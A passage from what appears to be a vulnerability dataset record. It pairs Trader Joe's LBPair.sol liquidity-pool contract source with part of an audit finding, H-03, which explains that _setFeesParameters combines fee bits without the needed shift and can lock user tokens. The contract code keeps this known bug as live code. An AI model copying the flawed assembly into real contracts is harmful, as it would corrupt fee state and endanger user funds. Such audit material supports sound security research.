_id;\n            }\n        }\n    }\n\n    /** External Functions **/\n\n    /// @notice Performs a low level swap, this needs to be called from a contract which performs important safety checks\n    /// @dev Will swap the full amount that this contract received of token X or Y\n    /// @param _swapForY whether the token sent was Y (true) or X (false)\n    /// @param _to The address of the recipient\n    /// @return amountXOut The amount of token X sent to `_to`\n    /// @return amountYOut The amount of token Y sent to `_to`\n    function swap(bool _swapForY, address _to)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountXOut, uint256 amountYOut)\n    {\n        PairInformation memory _pair = _pairInformation;\n\n        uint256 _amountIn = _swapForY\n            ? tokenX.received(_pair.reserveX, _pair.feesX.total)\n            : tokenY.received(_pair.reserveY, _pair.feesY.total);\n\n        if (_amountIn == 0) revert LBPair__InsufficientAmounts();\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n        _fp.updateVariableFeeParameters(_pair.activeId);\n        uint256 _startId = _pair.activeId;\n\n        uint256 _amountOut;\n        // Performs the actual swap, bin per bin\n        // It uses the findFirstBin function to make sure the bin we're currently looking at\n        // has liquidity in it.\n        while (true) {\n            Bin memory _bin = _bins[_pair.activeId];\n            if ((!_swapForY && _bin.reserveX != 0) || (_swapForY && _bin.reserveY != 0)) {\n                (uint256 _amountInToBin, uint256 _amountOutOfBin, FeeHelper.FeesDistribution memory _fees) = _bin\n                    .getAmounts(_fp, _pair.activeId, _swapForY, _amountIn);\n\n                _bin.updateFees(_swapForY ? _pair.feesX : _pair.feesY, _fees, _swapForY, totalSupply(_pair.activeId));\n\n                _bin.updateReserves(_pair, _swapForY, _amountInToBin.safe112(), _amountOutOfBin.safe112());\n\n                _amountIn -= _amountInToBin + _fees.total;\n                _amountOut += _amountOutOfBin;\n\n                _bins[_pair.activeId] = _bin;\n\n                if (_swapForY) {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        _amountInToBin,\n                        0,\n                        0,\n                        _amountOutOfBin,\n                        _fp.volatilityAccumulated,\n                        _fees.total,\n                        0\n                    );\n                } else {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        0,\n                        _amountInToBin,\n                        _amountOutOfBin,\n                        0,\n                        _fp.volatilityAccumulated,\n                        0,\n                        _fees.total\n                    );\n                }\n            }\n\n            if (_amountIn != 0) {\n                _pair.activeId = _tree.findFirstBin(_pair.activeId, _swapForY);\n            } else {\n                break;\n            }\n        }\n\n        if (_amountOut == 0) revert LBPair__BrokenSwapSafetyCheck(); // Safety check\n\n        // We use oracleSize so it can start filling empty slot that were added recently\n        uint256 _updatedOracleId = _oracle.update(\n            _pair.oracleSize,\n            _pair.oracleSampleLifetime,\n            _pair.oracleLastTimestamp,\n            _pair.oracleId,\n            _pair.activeId,\n            _fp.volatilityAccumulated,\n            _startId.absSub(_pair.activeId)\n        );\n\n        // We update the oracleId and lastTimestamp if the sample write on another slot\n        if (_updatedOracleId != _pair.oracleId || _pair.oracleLastTimestamp == 0) {\n            // Can't overflow as the updatedOracleId < oracleSize\n            _pair.oracleId = uint16(_updatedOracleId);\n            _pair.oracleLastTimestamp = block.timestamp.safe40();\n\n            // We increase the activeSize if the updated sample is written in a new slot\n            // Can't overflow as _updatedOracleId < maxSize = 2**16-1\n            unchecked {\n                if (_updatedOracleId == _pair.oracleActiveSize) ++_pair.oracleActiveSize;\n            }\n        }\n\n        _feeParameters = _fp;\n        _pairInformation = _pair;\n\n        if (_swapForY) {\n            amountYOut = _amountOut;\n            tokenY.safeTransfer(_to, _amountOut);\n        } else {\n            amountXOut = _amountOut;\n            tokenX.safeTransfer(_to, _amountOut);\n        }\n    }\n\n    /// @notice Performs a flash loan\n    /// @param _to the address that will execute the external call\n    /// @param _amountXOut The amount of tokenX\n    /// @param _amountYOut The amount of tokenY\n    /// @param _data The bytes data that will be forwarded to _to\n    function flashLoan(\n        address _to,\n        uint256 _amountXOut,\n        uint256 _amountYOut,\n        bytes calldata _data\n    ) external override nonReentrant {\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        uint256 _fee = factory.flashLoanFee();\n\n        FeeHelper.FeesDistribution memory _feesX = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountXOut, _fee));\n        FeeHelper.FeesDistribution memory _feesY = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountYOut, _fee));\n\n        (uint256 _reserveX, uint256 _reserveY, uint256 _id) = _getReservesAndId();\n\n        tokenX.safeTransfer(_to, _amountXOut);\n        tokenY.safeTransfer(_to, _amountYOut);\n\n        ILBFlashLoanCallback(_to).LBFlashLoanCallback(\n            msg.sender,\n            _amountXOut,\n            _amountYOut,\n            _feesX.total,\n            _feesY.total,\n            _data\n        );\n\n        _feesX.flashLoanHelper(_pairInformation.feesX, tokenX, _reserveX);\n        _feesY.flashLoanHelper(_pairInformation.feesY, tokenY, _reserveY);\n\n        uint256 _totalSupply = totalSupply(_id);\n\n        _bins[_id].accTokenXPerShare += _feesX.getTokenPerShare(_totalSupply);\n        _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);\n\n        emit FlashLoan(msg.sender, _to, _amountXOut, _amountYOut, _feesX.total, _feesY.total);\n    }\n\n    /// @notice Performs a low level add, this needs to be called from a contract which performs important safety checks.\n    /// @param _ids The list of ids to add liquidity\n    /// @param _distributionX The distribution of tokenX with sum(_distributionX) = 1e18 (100%) or 0 (0%)\n    /// @param _distributionY The distribution of tokenY with sum(_distributionY) = 1e18 (100%) or 0 (0%)\n    /// @param _to The address of the recipient\n    /// @return The amount of token X that was added to the pair\n    /// @return The amount of token Y that was added to the pair\n    /// @return liquidityMinted Amount of LBToken minted\n    function mint(\n        uint256[] memory _ids,\n        uint256[] memory _distributionX,\n        uint256[] memory _distributionY,\n        address _to\n    )\n        external\n        override\n        nonReentrant\n        returns (\n            uint256,\n            uint256,\n            uint256[] memory liquidityMinted\n        )\n    {\n        if (_ids.length == 0 || _ids.length != _distributionX.length || _ids.length != _distributionY.length)\n            revert LBPair__WrongLengths();\n\n        PairInformation memory _pair = _pairInformation;\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        MintInfo memory _mintInfo;\n\n        _mintInfo.amountXIn = tokenX.received(_pair.reserveX, _pair.feesX.total).safe128();\n        _mintInfo.amountYIn = tokenY.received(_pair.reserveY, _pair.feesY.total).safe128();\n\n        liquidityMinted = new uint256[](_ids.length);\n\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                _mintInfo.id = _ids[i].safe24();\n                Bin memory _bin = _bins[_mintInfo.id];\n\n                if (_bin.reserveX == 0 && _bin.reserveY == 0) _tree.addToTree(_mintInfo.id);\n\n                _mintInfo.distributionX = _distributionX[i];\n                _mintInfo.distributionY = _distributionY[i];\n\n                if (\n                    _mintInfo.distributionX > Constants.PRECISION ||\n                    _mintInfo.distributionY > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionX += _mintInfo.distributionX) > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionY += _mintInfo.distributionY) > Constants.PRECISION\n                ) revert LBPair__DistributionsOverflow();\n\n                // Can't overflow as amounts are uint128 and distributions are smaller or equal to 1e18\n                _mintInfo.amountX = (_mintInfo.amountXIn * _mintInfo.distributionX) / Constants.PRECISION;\n                _mintInfo.amountY = (_mintInfo.amountYIn * _mintInfo.distributionY) / Constants.PRECISION;\n\n                uint256 _price = BinHelper.getPriceFromId(_mintInfo.id, _fp.binStep);\n                if (_mintInfo.id >= _pair.activeId) {\n                    if (_mintInfo.id == _pair.activeId) {\n                        uint256 _totalSupply = totalSupply(_mintInfo.id);\n\n                        uint256 _userL = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                            _mintInfo.amountY;\n\n                        uint256 _receivedX;\n                        uint256 _receivedY;\n                        {\n                            uint256 _supply = _totalSupply + _userL;\n                            _receivedX = (_userL * (uint256(_bin.reserveX) + _mintInfo.amountX)) / _supply;\n                            _receivedY = (_userL * (uint256(_bin.reserveY) + _mintInfo.amountY)) / _supply;\n                        }\n\n                        _fp.updateVariableFeeParameters(_mintInfo.id);\n\n                        if (_mintInfo.amountX > _receivedX) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountX - _receivedX)\n                            );\n\n                            _mintInfo.amountX -= _fees.total;\n                            _mintInfo.activeFeeX += _fees.total;\n\n                            _bin.updateFees(_pair.feesX, _fees, true, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, _fees.total, 0);\n                        } else if (_mintInfo.amountY > _receivedY) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountY - _receivedY)\n                            );\n\n                            _mintInfo.amountY -= _fees.total;\n                            _mintInfo.activeFeeY += _fees.total;\n\n                            _bin.updateFees(_pair.feesY, _fees, false, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, 0, _fees.total);\n                        }\n                    } else if (_mintInfo.amountY != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n                } else if (_mintInfo.amountX != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n\n                uint256 _liquidity = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                    _mintInfo.amountY;\n\n                if (_liquidity == 0) revert LBPair__InsufficientLiquidityMinted(_mintInfo.id);\n\n                liquidityMinted[i] = _liquidity;\n\n                // The addition can't overflow as the amounts are checked to be uint128 and the reserves are uint112\n                _bin.reserveX = (_mintInfo.amountX + _bin.reserveX).safe112();\n                _bin.reserveY = (_mintInfo.amountY + _bin.reserveY).safe112();\n\n                // The addition or the cast can't overflow as it would have reverted during the L568 and L569 if amounts were greater than uint112\n                _pair.reserveX += uint112(_mintInfo.amountX);\n                _pair.reserveY += uint112(_mintInfo.amountY);\n\n                _mintInfo.amountXAddedToPair += _mintInfo.amountX;\n                _mintInfo.amountYAddedToPair += _mintInfo.amountY;\n\n                _bins[_mintInfo.id] = _bin;\n                _mint(_to, _mintInfo.id, _liquidity);\n\n                emit LiquidityAdded(\n                    msg.sender,\n                    _to,\n                    _mintInfo.id,\n                    _liquidity,\n                    _mintInfo.amountX,\n                    _mintInfo.amountY,\n                    _mintInfo.distributionX,\n                    _mintInfo.distributionY\n                );\n            }\n\n            _pairInformation = _pair;\n\n            uint256 _amountAddedPlusFee = _mintInfo.amountXAddedToPair + _mintInfo.activeFeeX;\n            // If user sent too much tokens, We send them back the excess\n            if (_mintInfo.amountXIn > _amountAddedPlusFee) {\n                tokenX.safeTransfer(_to, _mintInfo.amountXIn - _amountAddedPlusFee);\n            }\n\n            _amountAddedPlusFee = _mintInfo.amountYAddedToPair + _mintInfo.activeFeeY;\n            if (_mintInfo.amountYIn > _amountAddedPlusFee) {\n                tokenY.safeTransfer(_to, _mintInfo.amountYIn - _amountAddedPlusFee);\n            }\n        }\n\n        return (_mintInfo.amountXAddedToPair, _mintInfo.amountYAddedToPair, liquidityMinted);\n    }\n\n    /// @notice Performs a low level remove, this needs to be called from a contract which performs important safety checks\n    /// @param _ids The ids the user want to remove its liquidity\n    /// @param _amounts The amount of token to burn\n    /// @param _to The address of the recipient\n    /// @return amountX The amount of token X sent to `_to`\n    /// @return amountY The amount of token Y sent to `_to`\n    function burn(\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address _to\n    ) external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        (uint256 _pairReserveX, uint256 _pairReserveY, uint256 _activeId) = _getReservesAndId();\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint24 _id = _ids[i].safe24();\n                uint256 _amountToBurn = _amounts[i];\n\n                if (_amountToBurn == 0) revert LBPair__InsufficientLiquidityBurned(_id);\n\n                (uint256 _reserveX, uint256 _reserveY) = _getBin(_id);\n\n                uint256 _totalSupply = totalSupply(_id);\n\n                uint256 _amountX;\n                uint256 _amountY;\n\n                if (_id <= _activeId) {\n                    _amountY = _amountToBurn.mulDivRoundDown(_reserveY, _totalSupply);\n\n                    amountY += _amountY;\n                    _reserveY -= _amountY;\n                    _pairReserveY -= _amountY;\n                }\n                if (_id >= _activeId) {\n                    _amountX = _amountToBurn.mulDivRoundDown(_reserveX, _totalSupply);\n\n                    amountX += _amountX;\n                    _reserveX -= _amountX;\n                    _pairReserveX -= _amountX;\n                }\n\n                if (_reserveX == 0 && _reserveY == 0) _tree.removeFromTree(_id);\n\n                // Optimized `_bins[_id] = _bin` to do only 1 sstore\n                assembly {\n                    mstore(0, _id)\n                    mstore(32, _bins.slot)\n                    let slot := keccak256(0, 64)\n\n                    let reserves := add(shl(_OFFSET_BIN_RESERVE_Y, _reserveY), _reserveX)\n                    sstore(slot, reserves)\n                }\n\n                _burn(address(this), _id, _amountToBurn);\n\n                emit LiquidityRemoved(msg.sender, _to, _id, _amountToBurn, _amountX, _amountY);\n            }\n        }\n\n        // Optimization to do only 2 sstore\n        _pairInformation.reserveX = uint136(_pairReserveX);\n        _pairInformation.reserveY = uint136(_pairReserveY);\n\n        tokenX.safeTransfer(_to, amountX);\n        tokenY.safeTransfer(_to, amountY);\n    }\n\n    /// @notice Increase the length of the oracle\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function increaseOracleLength(uint16 _newSize) external override {\n        _increaseOracle(_newSize);\n    }\n\n    /// @notice Collect fees of an user\n    /// @param _account The address of the user\n    /// @param _ids The list of bin ids to collect fees in\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectFees(address _account, uint256[] memory _ids)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountX, uint256 amountY)\n    {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_account];\n            delete _unclaimedFees[_account];\n\n            amountX = _unclaimedData.decode(type(uint128).max, 0);\n            amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n                    _updateUserDebts(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n            }\n\n            if (amountX != 0) {\n                _pairInformation.feesX.total -= uint128(amountX);\n            }\n            if (amountY != 0) {\n                _pairInformation.feesY.total -= uint128(amountY);\n            }\n\n            tokenX.safeTransfer(_account, amountX);\n            tokenY.safeTransfer(_account, amountY);\n\n            emit FeesCollected(msg.sender, _account, amountX, amountY);\n        }\n    }\n\n    /// @notice Collect the protocol fees and send them to the feeRecipient\n    /// @dev The balances are not zeroed to save gas by not resetting the storage slot\n    /// Only callable by the fee recipient\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectProtocolFees() external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        unchecked {\n            address _feeRecipient = factory.feeRecipient();\n\n            if (msg.sender != _feeRecipient) revert LBPair__OnlyFeeRecipient(_feeRecipient, msg.sender);\n\n            // The fees returned can't be greater than uint128, so the assembly blocks are safe\n            (\n                uint256 _feesXTotal,\n                uint256 _feesYTotal,\n                uint256 _feesXProtocol,\n                uint256 _feesYProtocol\n            ) = _getGlobalFees();\n\n            if (_feesXProtocol > 1) {\n                amountX = _feesXProtocol - 1;\n                _feesXTotal -= amountX;\n\n                // Assembly block that does:\n                // _pairInformation.feesX = FeeHelper.FeesDistribution({total: _feesXTotal, protocol: 1});\n                assembly {\n                    let _slotX := add(_pairInformation.slot, 2)\n\n                    sstore(_slotX, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesXTotal))\n                }\n\n                tokenX.safeTransfer(_feeRecipient, amountX);\n            }\n\n            if (_feesYProtocol > 1) {\n                amountY = _feesYProtocol - 1;\n                _feesYTotal -= amountY;\n\n                // Assembly block that does:\n                // _pairInformation.feesY = FeeHelper.FeesDistribution({total: _feesYTotal, protocol: 1});\n                assembly {\n                    let _slotY := add(_pairInformation.slot, 3)\n\n                    sstore(_slotY, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesYTotal))\n                }\n\n                tokenY.safeTransfer(_feeRecipient, amountY);\n            }\n\n            emit ProtocolFeesCollected(msg.sender, _feeRecipient, amountX, amountY);\n        }\n    }\n\n    /// @notice Set the fees parameters\n    /// @dev Needs to be called by the factory that will validate the values\n    /// The bin step will not change\n    /// Only callable by the factory\n    /// @param _packedFeeParameters The packed fee parameters\n    function setFeesParameters(bytes32 _packedFeeParameters) external override onlyFactory {\n        _setFeesParameters(_packedFeeParameters);\n    }\n\n    function forceDecay() external override onlyFactory {\n        unchecked {\n            _feeParameters.volatilityReference = uint24(\n                (uint256(_feeParameters.reductionFactor) * _feeParameters.volatilityReference) /\n                    Constants.BASIS_POINT_MAX\n            );\n        }\n    }\n\n    /** Internal Functions **/\n\n    /// @notice Collect and update fees before any token transfer, mint or burn\n    /// @param _from The address of the owner of the token\n    /// @param _to The address of the recipient of the  token\n    /// @param _id The id of the token\n    /// @param _amount The amount of token of type `id`\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) internal override(LBToken) {\n        unchecked {\n            super._beforeTokenTransfer(_from, _to, _id, _amount);\n\n            Bin memory _bin = _bins[_id];\n\n            if (_from != _to) {\n                if (_from != address(0) && _from != address(this)) {\n                    uint256 _balanceFrom = balanceOf(_from, _id);\n\n                    _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);\n                }\n\n                if (_to != address(0) && _to != address(this)) {\n                    uint256 _balanceTo = balanceOf(_to, _id);\n\n                    _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);\n                }\n            }\n        }\n    }\n\n    /** Private Functions **/\n\n    /// @notice View function to get the pending fees of an account on a given bin\n    /// @param _bin  The bin where the user is collecting fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user is collecting fees\n    /// @param _balance The previous balance of the user\n    /// @return amountX The amount of tokenX pending for the account\n    /// @return amountY The amount of tokenY pending for the account\n    function _getPendingFees(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private view returns (uint256 amountX, uint256 amountY) {\n        Debts memory _debts = _accruedDebts[_account][_id];\n\n        amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;\n        amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;\n    }\n\n    /// @notice Update fees of a given user\n    /// @param _bin The bin where the user has collected fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _balance The new balance of the user\n    function _updateUserDebts(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private {\n        uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n        uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n\n        _accruedDebts[_account][_id].debtX = _debtX;\n        _accruedDebts[_account][_id].debtY = _debtY;\n    }\n\n    /// @notice Update the unclaimed fees of a given user before a transfer\n    /// @param _bin The bin where the user has collected fees\n    /// @param _user The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _previousBalance The previous balance of the user\n    /// @param _newBalance The new balance of the user\n    function _cacheFees(\n        Bin memory _bin,\n        address _user,\n        uint256 _id,\n        uint256 _previousBalance,\n        uint256 _newBalance\n    ) private {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_user];\n\n            uint256 amountX = _unclaimedData.decode(type(uint128).max, 0);\n            uint256 amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _user, _id, _previousBalance);\n            _updateUserDebts(_bin, _user, _id, _newBalance);\n\n            (amountX += _amountX).safe128();\n            (amountY += _amountY).safe128();\n\n            _unclaimedFees[_user] = bytes32((amountY << 128) | amountX);\n        }\n    }\n\n    /// @notice Internal function to set the fee parameters of the pair\n    /// @param _packedFeeParameters The packed fee parameters\n    function _setFeesParameters(bytes32 _packedFeeParameters) internal {\n        bytes32 _feeStorageSlot;\n        assembly {\n            _feeStorageSlot := sload(_feeParameters.slot)\n        }\n\n        uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);\n        uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n        assembly {\n            sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n        }\n    }\n\n    /// @notice Private function to increase the oracle's number of sample\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function _increaseOracle(uint16 _newSize) private {\n        uint256 _oracleSize = _pairInformation.oracleSize;\n\n        if (_oracleSize >= _newSize) revert LBPair__NewSizeTooSmall(_newSize, _oracleSize);\n\n        _pairInformation.oracleSize = _newSize;\n\n        unchecked {\n            for (uint256 _id = _oracleSize; _id < _newSize; ++_id) {\n                _oracle.initialize(_id);\n            }\n        }\n\n        emit OracleSizeIncreased(_oracleSize, _newSize);\n    }\n\n    /// @notice Private view function to return the oracle's parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    function _getOracleParameters()\n        internal\n        view\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId\n        )\n    {\n        bytes32 _slot;\n        assembly {\n            _slot := sload(add(_pairInformation.slot, 1))\n        }\n        oracleSampleLifetime = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SAMPLE_LIFETIME);\n        oracleSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SIZE);\n        oracleActiveSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_ACTIVE_SIZE);\n        oracleLastTimestamp = _slot.decode(type(uint40).max, _OFFSET_ORACLE_LAST_TIMESTAMP);\n        oracleId = _slot.decode(type(uint24).max, _OFFSET_ORACLE_ID);\n    }\n\n    /// @notice Internal view function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function _getReservesAndId()\n        internal\n        view\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        uint256 _mask24 = type(uint24).max;\n        uint256 _mask136 = type(uint136).max;\n        assembly {\n            let slot := sload(add(_pairInformation.slot, 1))\n            reserveY := and(slot, _mask136)\n\n            slot := sload(_pairInformation.slot)\n            activeId := and(slot, _mask24)\n            reserveX := and(shr(_OFFSET_PAIR_RESERVE_X, slot), _mask136)\n        }\n    }\n\n    /// @notice Internal view function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function _getBin(uint24 _id) internal view returns (uint256 reserveX, uint256 reserveY) {\n        bytes32 _data;\n        uint256 _mask112 = type(uint112).max;\n        // low level read of mapping to only load 1 storage slot\n        assembly {\n            mstore(0, _id)\n            mstore(32, _bins.slot)\n            _data := sload(keccak256(0, 64))\n\n            reserveX := and(_data, _mask112)\n            reserveY := shr(_OFFSET_BIN_RESERVE_Y, _data)\n        }\n\n        return (reserveX.safe112(), reserveY.safe112());\n    }\n\n    /// @notice Internal view function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function _getGlobalFees()\n        internal\n        view\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        bytes32 _slotX;\n        bytes32 _slotY;\n        assembly {\n            _slotX := sload(add(_pairInformation.slot, 2))\n            _slotY := sload(add(_pairInformation.slot, 3))\n        }\n\n        feesXTotal = _slotX.decode(type(uint128).max, 0);\n        feesYTotal = _slotY.decode(type(uint128).max, 0);\n\n        feesXProtocol = _slotX.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n        feesYProtocol = _slotY.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n    }\n\n    /// @notice Internal pure function to return the flashloan fee amount\n    /// @param _amount The amount to flashloan\n    /// @param _fee the fee percentage, in basis point\n    /// @return The fee amount\n    function _getFlashLoanFee(uint256 _amount, uint256 _fee) internal pure returns (uint256) {\n        return (_amount * _fee) / Constants.PRECISION;\n    }\n}\n\n\n",
        "CodeNames": [
            "LBFactory.sol",
            "demo.sol",
            "Test.sol",
            "LBErrors.sol",
            "LBPair.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\nstruct FeeParameters {\n    // 144 lowest bits in slot \n    uint16 binStep;\n    uint16 baseFactor;\n    uint16 filterPeriod; \n    uint16 decayPeriod; \n    uint16 reductionFactor; \n    uint24 variableFeeControl;\n    uint16 protocolShare;\n    uint24 maxVolatilityAccumulated; \n    \n    // 112 highest bits in slot \n    uint24 volatilityAccumulated;\n    uint24 volatilityReference;\n    uint24 indexRef;\n    uint40 time; \n}\n",
                    "//solidity\n/// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917\n\n/// @notice Internal function to set the fee parameters of the pair\n/// @param _packedFeeParameters The packed fee parameters\nfunction _setFeesParameters(bytes32 _packedFeeParameters) internal {\n    bytes32 _feeStorageSlot;\n    assembly {\n        _feeStorageSlot := sload(_feeParameters.slot)\n    }\n\n    /// #explain]  it will get 112 highest bits of feeStorageSlot,\n    ///             and stores it in the 112 lowest bits of _varParameters \n    uint256 _varParameters \n        = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);\n\n    /// #explain]  get 144 lowest bits of packedFeeParameters \n    ///             and stores it in the 144 lowest bits of _newFeeParameters  \n    uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n    assembly {\n        // $audit-high] wrong operation `or` here \n        //              Mitigate: or(_newFeeParameters, _varParameters << 144)    \n        sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n    }\n}\n",
                    "\nforge test --match-contract High1Test -vv\n"
                ],
                "Type": " Wrong implementation of function  LBPair.setFeeParameter  can break the funcionality of LBPair and make user's tokens locked ",
                "Description": "*Submitted by KIntern_NA(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/384), also found by Trust(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/425) and KingNFT(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/203)*\n\nStruct FeeParameters contains 12 fields as follows:\n\nsolidity\nstruct FeeParameters {\n    // 144 lowest bits in slot \n    uint16 binStep;\n    uint16 baseFactor;\n    uint16 filterPeriod; \n    uint16 decayPeriod; \n    uint16 reductionFactor; \n    uint24 variableFeeControl;\n    uint16 protocolShare;\n    uint24 maxVolatilityAccumulated; \n    \n    // 112 highest bits in slot \n    uint24 volatilityAccumulated;\n    uint24 volatilityReference;\n    uint24 indexRef;\n    uint40 time; \n}\n\n\nFunction LBPair.setFeeParamters(bytes _packedFeeParamters)(https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of LBPair._feeParameter's slot to 144 lowest bits of _packedFeeParameters (The layout of _packedFeeParameters can be seen here(https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)).\n\nsolidity\n/// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917\n\n/// @notice Internal function to set the fee parameters of the pair\n/// @param _packedFeeParameters The packed fee parameters\nfunction _setFeesParameters(bytes32 _packedFeeParameters) internal {\n    bytes32 _feeStorageSlot;\n    assembly {\n        _feeStorageSlot := sload(_feeParameters.slot)\n    }\n\n    /// #explain]  it will get 112 highest bits of feeStorageSlot,\n    ///             and stores it in the 112 lowest bits of _varParameters \n    uint256 _varParameters \n        = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);\n\n    /// #explain]  get 144 lowest bits of packedFeeParameters \n    ///             and stores it in the 144 lowest bits of _newFeeParameters  \n    uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n    assembly {\n        // $audit-high] wrong operation or here \n        //              Mitigate: or(_newFeeParameters, _varParameters << 144)    \n        sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n    }\n}\n\n\nAs we can see in the implementation of LBPair._setFeesParametes above, it gets the 112 highest bits of _feeStorageSlot and stores it in the 112 lowest bits of _varParameter. Then it gets the 144 lowest bits of packedFeeParameter and stores it in the 144 lowest bits of _newFeeParameters.\n\nFollowing the purpose of function setFeeParameters, the new LBPair._feeParameters should form as follow:\n\n    // keep 112 highest bits remain unchanged \n    // set 144 lowest bits to _newFeeParameter\n    ...112 